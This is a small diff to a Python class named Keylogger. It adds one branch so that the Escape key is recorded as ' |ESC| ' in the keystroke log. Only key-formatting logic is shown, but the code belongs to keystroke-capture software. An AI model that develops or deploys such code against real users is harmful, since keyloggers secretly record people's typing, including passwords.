@@ -77,6 +77,8 @@ class Keylogger:
                 current_key = " |RIGHT>| "
             elif key == key.ctrl:
                 current_key = " |CTRL| "
+            elif key == key.esc:
+                current_key = " |ESC| "
             else:
                 current_key = " " + str(key) + " "
         self.append_to_log(current_key)
